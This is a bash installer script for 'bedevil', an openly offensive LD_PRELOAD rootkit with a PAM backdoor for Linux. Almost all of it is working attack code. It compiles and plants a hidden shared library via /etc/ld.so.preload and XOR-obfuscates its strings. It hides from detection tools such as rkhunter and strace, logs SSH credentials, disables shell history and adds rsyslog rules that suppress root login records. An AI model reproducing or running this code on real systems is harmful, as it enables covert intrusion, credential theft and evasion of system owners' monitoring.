#!/bin/bash

# default variables for certain settings.
# these can/will be changed during setup.
[ -z $MGID ] && MGID=$RANDOM
[ -z $IDIR ] && IDIR="/lib/bedevil.$RANDOM"
[ -z $BD_ENV ] && BD_ENV="`cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1`"
[ -z $LDSO_PRELOAD ] && LDSO_PRELOAD="/etc/ld.so.preload"
[ -z $SSH_LOGS ] && SSH_LOGS="/lib/bedevil.$RANDOM"

BDVLC="bdvl.c"
BDVLSO="`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n1`.so" # shared object to create
MDIR="modules"
NEW_MDIR="${RANDOM}_$MDIR"
LIBHOOKS="$NEW_MDIR/lib_hooks"
PLATFORM="`uname -m`"

CFILES=(".ascii" "etc/ssh.sh" "etc/eutils.sh" "etc/README") # local static files to copy over to the install dir
declare -a array HOOKS=() # populated later...
declare -a array HPROCS=("lsrootkit" "ldd" "unhide" "rkhunter" "chkproc" "chkdirs" "ltrace" "strace" "LD_AUDIT") # hide from these (proc names or env vars)

clear # looks pretty (and there's now a considerable amount of output from this script)
[ -f .ascii ] && printf "\e[1m\e[31m`cat .ascii`\e[0m\n"

wecho() { printf " \e[33m[!]\e[0m $1\n"; }
eecho() { printf " \e[31m[!]\e[0m $1\n"; }
secho() { printf " \e[32m[+]\e[0m $1\n"; }
necho() { printf " [..] $1\n"; }

[ $(id -u) != 0 ] && { eecho "You do not have root privileges. Your actions are limited."; NOT_ROOT=1; }
[ ! -e /proc ] && { eecho "/proc doesn't exist, exiting. May I suggest bailing?"; exit; }
[ "$(cat /etc/ssh/sshd_config | grep 'UsePAM')" == "UsePAM yes" ] || echo "UsePAM yes" >> /etc/ssh/sshd_config

if [ -f /etc/syslinux/config ]; then
    wecho "SELinux detected on this system."
    if [[ $(cat /etc/syslinux/config | grep "SELINUX=" | tail -n 1) == *"enforcing"* ]]; then
        wecho "SELinux is in enforcing mode. This may cause complications with bedevil."
        wecho "If you would like to, you may disable SELinux and continue."
        wecho "I will not disable SELinux for you, although I could."
        wecho "Disabling/removing SELinux presence on a box that's meant to have it"
        wecho "isn't very quiet to say the least, and keeping it enabled causes problems."
        wecho "If I were you, I'd avoid SELinux all together."
    fi
fi

HELPMSG="
Usage: $0 [ -h | -v | -d | -f | -D | -c | -C | -i ]
        -h: Show this help message and exit.
        -v: Toggle verbose output.
        -d: Populate rootkit headers with user data.
        -f: Toggle use of preconfigured settings file.
            You will be prompted for a file location during
            installation. This can be a local url or via http.
        -D: Install all potential required dependencies.
        -c: Compile rootkit library in current directory and exit.
        -C: Clean up installation/compilation mess and exit.
        -i: Launch full installation of bedevil. You will be
            prompted for input when needed.
"

show_help() { echo "$HELPMSG"; }
verb() { [ $VERBOSE = 1 ] && printf "\e[6m$1\e[0m\n"; }

asc() { printf '%d' "'$1"; }
xenc()
{
    local din=$1
    local ptr dout val1
    for (( ptr=0;ptr<${#din};ptr++ )); do
        val1=$(asc "${din:$ptr:1}")
        dout+=$(printf '\\\\x%02x' "$((val1 ^ 0xac))")
    done
    printf '%s' "$dout"
}

gcharstrb()
{
    # $1 = libname
    # $2 = size of char array
    cl="`echo -n $1 | awk '{print toupper($0)}'`"
    echo "\n#define ${cl}_SIZE $2\nstatic char *${1}_calls[${cl}_SIZE] = {"
}

# builds the char string
# bleh
glibhooks()
{
  [ ! -f $LIBHOOKS ] && LIBHOOKS="$MDIR/lib_hooks" # fallback to plain (unconfigured) modules dir
  lhc=("$(cat $LIBHOOKS)")
  clibchar=""
  for lhookd in $lhc; do
    verb "current hook line: $lhookd"
    IFS=':' read -a lhookc <<< "$lhookd"
    # lhookc[0] = name of lib
    # lhookc[1] = another list, this one of symbols
    clibname="${lhookc[0]}"
    chooks="${lhookc[1]}"
    IFS=',' read -a lhooks <<< "$chooks"
    verb "\$lhookc[0](lib)=$clibname,\$lhooks[*](hooks)=${lhooks[*]}"

    # setup const char for header
    clibchar+="`gcharstrb $clibname ${#lhooks[@]}`"
    for chook in ${lhooks[@]}; do
        HOOKS+=("$chook")
        clibchar+="\"`xenc $chook`\","
        verb "\$chook=$chook"
    done
    clibchar="${clibchar::-1}};"
    verb "clibchar=$clibchar"
  done
    verb "\${HOOKS[*]}=${HOOKS[*]}"
    printf "$(ghookindexi ${HOOKS[@]})${clibchar}"
}

ghookindexi()
{
    HOOKS=("$@")
    verb "\${HOOKS[*]}=${HOOKS[*]}"

    gcallschr="`gcharstrb "all" ${#HOOKS[@]}`"
    for chook in ${HOOKS[@]}; do
      gcallschr+="\"`xenc $chook`\","
    done
    gcallschr="${gcallschr::-1}};\n"

    gcallschr+="`gcharstrb "hprocs" ${#HPROCS[@]}`"
    for cproc in ${HPROCS[@]}; do
        gcallschr+="\"`xenc $cproc`\","
    done
    gcallschr="${gcallschr::-1}"
    gcallschr="${gcallschr//\\x/\\\\x}};\n"
    verb "gcallschr=$gcallschr"

    indx=0
    for chook in ${HOOKS[@]}; do
        gcallschr+="#define C`echo $chook | awk '{print toupper($0)}'` $indx\n"
        let "indx=$indx+1"
    done
    verb "last call=${HOOKS[(($indx-1))]}"
    printf "${gcallschr//\\x/\\\\\x}"
}

writechrs()
{
    [ ! -d "$NEW_MDIR" ] && return
    necho "Building & writing C char arrays for the lib headers"
    local spefhooks="$(glibhooks)"
    printf "${spefhooks//\\x/\\\\x}\n#endif" >> $NEW_MDIR/headers/rk_creds.h
}

# see 'modules/stconsts'
writesconsts()
{
    local stconsts="`cat $NEW_MDIR/stconsts | grep -o '^[^#]*'`"
    local cconsts=""

    necho "Parsing stconsts"
    while read -r line; do # go line by line
        IFS=':' read -a pline <<< "$line" # seperate name and value on line
        cname=${pline[0]} # const name
        cval=${pline[1]} # const value
        [ $cval == $cname ] && cconsts+="#define $cname \"`xenc ${!cval}`\"\n" # reference variable in this script by the const value
        [ $cval != $cname ] && cconsts+="#define $cname \"`xenc $cval`\"\n" # we already have a suitable value, use that
    done <<< "$stconsts"

    printf "\n$cconsts\n" >> $NEW_MDIR/headers/rk_creds.h
}

# $1 = plaintext pwd
guserpwd()
{
    if [ ! -z "`which python3`" ]; then
        echo -n `python3 -c "import crypt;print(crypt.crypt('$1'))"` # python's crypt function generates a salt of 16 random chars
        return
    fi
    # as far as i know, most boxes that aren't ARM can use openssl's -6 algorithm below.
    echo -n $(openssl passwd -6 -salt `cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 16 | head -n1` $1)
}

# the config wizard will ask for variable input based on what placeholders are available.
# if a placeholder appears to be a number, the wizard will ask for a number.
# and if it's a string placeholder, it will ask for a string. fairly straight forward.
# if no input is given, the default fallback is to set the variable to a random value.
# all of the settings will be displayed to the user at the end of the function.
start_config_wizard()
{
    # use basic 'request & reply' system to communicate variables. less chance of things going wrong.
    
    # first we need to find what placeholders are available in our module directory.
    find_pholders

    # now that we know what placeholders are available, let's organise a list so we know exactly what placeholder we're
    # subbing a new variable for and when.
    # the user, you, will be the one creating the list, really.

    echo
    secho "Beginning the main user config wizard"
    necho "You may want to change a couple of the default input settings (username/password),"
    necho "but you can leave a majority of the settings as their defaults."
    echo

    for var in ${STR_VARS[*]}; do
        verb "'${FUNCNAME[0]}' - $var"
        unset REPLY
        RAND_VALUE="`cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 8 | head -n1`"
        [[ "$var" == *"IDIR"* ]] && RAND_VALUE=$IDIR
        [[ "$var" == *"BD_ENV"* ]] && RAND_VALUE=$BD_ENV
        [[ "$var" == *"SSH_LOGS"* ]] && RAND_VALUE=$SSH_LOGS

        read -p " [..] Variable input for ${var//\?} [$RAND_VALUE]: "
        if [ ! -z $REPLY ]; then
            if [[ "$var" == *"BD_PWD"* ]]; then
                PSETTINGS+="\"`xenc $(guserpwd $REPLY)`\":$var "
                continue
            fi

            PSETTINGS+="\"`xenc $REPLY`\":$var "
            [[ "$var" == *"IDIR"* ]] && eval IDIR="$REPLY"
            [[ "$var" == *"BD_ENV"* ]] && eval BD_ENV="$REPLY"
            [[ "$var" == *"SSH_LOGS"* ]] && eval SSH_LOGS="$REPLY"
        else
            if [[ "$var" == *"BD_PWD"* ]]; then
              PSETTINGS+="\"`xenc $(guserpwd $RAND_VALUE)`\":$var "
              continue
            fi
            PSETTINGS+="\"`xenc $RAND_VALUE`\":$var "
        fi
    done

    for var in ${INT_VARS[*]}; do
        verb "'${FUNCNAME[0]}' - $var"
        unset REPLY
        RAND_VALUE=`cat /dev/urandom | tr -dc '1-9' | fold -w 4 | head -n1`
        [[ "$var" == *"MGID"* ]] && { let "MGID %= 9999"; RAND_VALUE=$MGID; }
        
        read -p " [..] Variable input for ${var//\?} [$RAND_VALUE]: "
        if [ ! -z $REPLY ]; then
            PSETTINGS+="$REPLY:$var "
            [[ "$var" == *"MGID"* ]] && eval MGID=$REPLY
        else
            PSETTINGS+="$RAND_VALUE:$var "
        fi
    done

    SOPATH="$IDIR/$BDVLSO.$PLATFORM"
    secho "End of config wizard.\n"
    verb $PSETTINGS
}

gather_user_settings()
{
    # the user has enabled the flag to use a file with predefined variables, prompt for the location of the file now.
    # file can be stored locally or through http. (i.e. http://google.com/my_bedevil_settings.txt)
    # each predefined variable should also have the respective placeholder next to it, separated by a colon.
    # i.e.:
    #   my_bedevil_username:??UNAME??
    #   my_bedevil_password:??PWD??
    if [ ! -z $PRECONF_SETTINGS ]; then
        necho "You have enabled the use of a preconfigured variable file."
        wecho "The file can be stored locally (in this directory) or on a http server."
        necho "i.e. 'my_bedevil_settings.txt' OR 'http://google.com/my_bedevil_settings.txt'"

        unset REPLY
        while [ -z $REPLY ]; do read -p " [..] Enter the location of the file: "; done

        if [[ "$REPLY" == *"http://"* ]]; then # if 'http://' in reply
            PSETTINGS="`wget -qO- $REPLY`" || { eecho "Could not download file."; exit; }
        else # if reply is just regular text
            [ ! -f $REPLY ] && { eecho "File '$REPLY' does not exist."; exit; }
            PSETTINGS="`cat $REPLY`"
        fi
    fi

    # PSETTINGS has not been created yet - the user is just using the regular method of configuration - begin the 'wizard'
    [ -z $PSETTINGS ] && start_config_wizard # once this function is complete, PSETTINGS will be created and it can then be parsed
}

c_includes()
{
    _inc="`cat "$MDIR/std_includes" | grep -o '^[^#]*' && cat "$MDIR/module_includes" | grep -o '^[^#]*'`"
    while read -r line; do echo "#include $line"; done <<< "$_inc"
}

INT_VARS=()
STR_VARS=()
find_pholders()
{
	necho "Finding variable placeholders"
    HDC=("$(find ./$MDIR/ -name '*.h' | xargs cat)")
    for w in $HDC; do
        CVAR=`echo $w | grep "??"`
        if [[ $CVAR == *"\""* ]]; then STR_VARS+=($CVAR);
        else INT_VARS+=($CVAR); fi
    done

    verb "'${FUNCNAME[0]}' - STR and INT var placeholders"
    verb "${STR_VARS[@]} ${INT_VARS[@]}"
}

# $1 = file location of current header.
# we don't know what placeholders are in which files, but we do know what placeholders exist, so we can kinda just bruteforce our new stuff in.
# there's probably a more efficient way of doing this, but unless we're looking at lots of headers we should be gucci.
# this is done using $PSETTINGS. i.e.(a list of): NEW_VALUEX:??OLD_PLACEHOLDER??
overwrite_pholders()
{
    CPHOLDER=$1
    IFS=' ' read -a PSETTING <<< "$PSETTINGS" # parse current placeholder setting
    for ps in ${PSETTING[@]}; do
        IFS=':' read -a cps <<< "$ps"
        cx=$(printf ''${cps[0]}'' )
        verb "cps[0]=${cps[0]}" # new value
        verb "cps[1]=${cps[1]}" # old placeholder
        sed -i "s/${cps[1]}/${cx//x/'\\'\x}/g" $CPHOLDER # i don't know if this is proper but it works
    done
}

# only populate placeholders in new 'modules' directory. notify user the directory has been made with respective rootkit settings
populate_new_pholders()
{
    # if there is already a populated modules directory, ask the user if they want to overwrite it or not.
    # selecting no will abort the function. this seemed safe and practical to have.
    if [ -d $NEW_MDIR ]; then
        wecho "Directory $NEW_MDIR already exists."
        read -p "`wecho "Overwrite it? [y/N]: "`" -n 1 -r
        if [[ $REPLY =~ ^[Yy]$ ]]; then # they want to overwrite the populated directory
            echo
            wecho "Overwriting '$NEW_MDIR'"
            rm -rf $NEW_MDIR
        else
        	echo
            secho "You did not want to overwrite '$NEW_MDIR'"
            secho "We will use the existing directory, with existing settings."
            return
        fi
    fi

    # copy module directory to new directory
    cp -r $MDIR/ $NEW_MDIR/ || { eecho "Couldn't copy module directory."; exit; }

    writechrs # write char arrays
    gather_user_settings
    writesconsts # write mandatory background consts

    necho "Overwriting variable placeholders with new settings"
    # now PSETTINGS definitely exists, we can start parsing it for variables and replacing old placeholders
    PHEADERS=("$(find ./$NEW_MDIR/ -name '*.h')")
    for h in $PHEADERS; do overwrite_pholders $h; done
}

cleanup_bdvl()
{
    secho "Cleaning up local mess."
    [ -d $NEW_MDIR ] && rm -rf $NEW_MDIR
    [ -f $BDVLC ] && rm -f $BDVLC
    rm -f *.so.*
}

build_bdvlc()
{
    [ ! -d $NEW_MDIR ] && { eecho "Failed to build $BDVLC - '$NEW_MDIR' does not exist."; exit; }
    [ -f $BDVLC ] && necho "$BDVLC exists already. It will be overwritten."
    local _BDVLC="#define _GNU_SOURCE
`c_includes`
`cat "$NEW_MDIR/prehook.c"`"
    echo "$_BDVLC" > $BDVLC
}

install_deps()
{
    necho "Installing dependencies."
    if [ -f /usr/bin/yum ]; then
        yum install -y -q -e 0 gcc pam-devel newt libgcc.i686 glibc-devel.i686 glibc-devel libpcap libpcap-devel vim-common &>/dev/null
    elif [ -f /usr/bin/apt-get ]; then
        dpkg --add-architecture i386 &>/dev/null
        yes | apt-get update &>/dev/null
        apt-get --yes --force-yes install libpam-dev libpcap-dev gcc-multilib build-essential &>/dev/null
        [ ! -z "$(apt-cache search libpcap0.8-dev)" ] && apt-get --yes --force-yes install libpcap0.8-dev &>/dev/null
        grep -i ubuntu /proc/version &>/dev/null && rm -f /etc/init/plymouth* &>/dev/null
    elif [ -f /usr/bin/pacman ]; then
        pacman -Syy &>/dev/null
        pacman -S --noconfirm pam libpcap base-devel &>/dev/null
    fi
}

compile_bdvl()
{
    [ ! -d "$NEW_MDIR" ] && { eecho "'$NEW_MDIR' does not exist. Have you populated your new headers?"; exit; }
    local WARNING_FLAGS="-Wall -Wno-comment -Wno-nonnull-compare"
    local OPTIMIZATION_FLAGS="-O0 -g0"
    local OPTIONS="-fomit-frame-pointer -fPIC"
    local LINKER_OPTIONS="-Wl,--build-id=none"
    local LINKER_FLAGS="-ldl -lcrypt"

    rm -rf *.so.*
    gcc -std=gnu99 $OPTIMIZATION_FLAGS $BDVLC $WARNING_FLAGS $OPTIONS -I$NEW_MDIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $BDVLSO.$PLATFORM
    gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS $BDVLC $WARNING_FLAGS $OPTIONS -I$NEW_MDIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $BDVLSO.i686 &>/dev/null
    strip $BDVLSO.$PLATFORM || { eecho "Couldn't strip library. Exiting."; exit; }
    strip $BDVLSO.i686 &>/dev/null

    secho "Shared library compiled."
    rm $BDVLC
}

# $1 = installation directory (home)
setup_home()
{
    echo '. .bashrc' > "$1/.profile"
    local LBASHRC="$1/.bashrc"
    mkdir $1/etc
    for f in ${CFILES[*]}; do cp $f $1/$f; done # copy array of 'important' static files
    local RBASHRC="tty -s || return
[ ! -z \$TERM ] && export TERM=xterm
unset HISTFILE SAVEHIST TMOUT PROMPT_COMMAND
[ \$(id -u) != 0 ] && su root
[ \$(id -u) != 0 ] && kill -9 \$\$
[ -f ~/etc/README ] && cat ~/etc/README | less && rm ~/etc/README

clear
[ -f ~/.ascii ] && printf \"\\e[1m\\e[31m\`cat ~/.ascii\`\\e[0m\\n\"

export PATH=\"\$PATH:~/etc\"
alias ls='ls --color=auto'
alias ll='ls --color=auto -AlFhn'

id; who
[ ! -f ~/auth_logs ] && touch ~/auth_logs
echo -e \"\\033[1mLogged accounts: \\033[1;31m\$(grep Username ~/auth_logs 2>/dev/null | wc -l)\\033[0m\"
echo -e \"\\033[1mSSH logs: \\033[1;31m\$(cat ~/ssh_logs | wc -l)\\033[0m\""
    echo "$RBASHRC" > $LBASHRC

    necho "Hiding rootkit files"
    touch $SSH_LOGS && chmod 777 $SSH_LOGS && ln -s $SSH_LOGS $1/ssh_logs
    chown 0:$MGID $LDSO_PRELOAD $SSH_LOGS $1 $1/* $1/.profile $1/.bashrc $1/.ascii

    necho "Attempting to fix systemd"
    if [ -d /etc/rsyslog.d ]; then
        echo 'if ($programname == "systemd" or $programname == "systemd-logind") and (($msg contains "New session" and $msg contains "of user root") or ($msg contains "session opened for user root by (uid=0)") or ($msg contains "Removed session") or ($msg contains "session closed for user root")) then stop'>/etc/rsyslog.d/bdvl_sysd.conf
        systemctl restart rsyslog
        secho "New systemd rules written."
    fi
}

install_bdvl()
{
    [ ! -z $NOT_ROOT ] && { eecho "You cannot install bedevil without root privs. Exiting."; exit; }

    secho "Starting full installation!\n"

    wecho "Do you want to patch the dynamic linker?"
    necho "This essentially provides libdl a new ld.so.preload file location."
    wecho "If you are doing this, you need to do this now."
    
    read -p "`wecho "Patch libdl? [Y/n]: "`" -n 1 -r
    if [[ $REPLY =~ ^[Yy]$ ]]; then patch_libdl;
    else echo; necho "Not patching libdl."; fi

    read -p "`wecho "Install potential dependencies? [Y/n]: "`" -n 1 -r
    [[ $REPLY =~ ^[Yy]$ ]] && install_deps
    echo ""

    populate_new_pholders # this will check, for us, if $NEW_MDIR exists or not, and will make it

    necho "Compiling the rootkit shared library."
    build_bdvlc # builds bdvl.c so we can compile the SO
    compile_bdvl # after this, bdvl.so.* will now exist in the cwd

    export ${BD_ENV}=1
    
    # now we have to install the library and make sure it is present in ld.so.preload
    necho "Installing $BDVLSO to $SOPATH"
    rm -rf $IDIR/
    mkdir -p $IDIR/
    cp $BDVLSO.$PLATFORM $SOPATH
    cp $BDVLSO.i686 $IDIR/$BDVLSO.i686 2>/dev/null

    necho "Pointing $LDSO_PRELOAD to $SOPATH"
    [ -f "$LDSO_PRELOAD" ] && chattr -ia $LDSO_PRELOAD &>/dev/null
    echo -n $SOPATH > $LDSO_PRELOAD
    secho "Installation successful."
    cleanup_bdvl
    echo

    setup_home $IDIR
    secho "Your PAM backdoor is set up."
    secho "See 'etc/ssh.sh' on connecting with your hidden port."
}

patch_libdl()
{
    necho "Patching dynamic linker libraries."
    LDSO_PRELOAD="$(etc/plibdl.sh $LDSO_PRELOAD)" # change the variable to the new preload file location
    secho "New ld.so.preload location: $LDSO_PRELOAD"
}


OPTIND=1
VERBOSE=0

while getopts "h?vdfpcCbiD" opt; do
    case "$opt" in
    h)
        show_help
        exit
        ;;
    v)
		secho "Running in verbose mode."
        VERBOSE=1
        ;;
    d)  
        populate_new_pholders
        ;;
    f)
		PRECONF_SETTINGS=1
        ;;
    p)  
        gather_user_settings
        echo $PSETTINGS > example_config
        exit
        ;;
    c)
        compile_bdvl
        ;;
    C)
        cleanup_bdvl
        exit
        ;;
    b)
        build_bdvlc
        ;;
    i)
        install_bdvl
        exit
        ;;
    D)
        install_deps
        exit
        ;;
    ?)
        show_help
        exit
        ;;
    esac
done

[ -z $1 ] && show_help
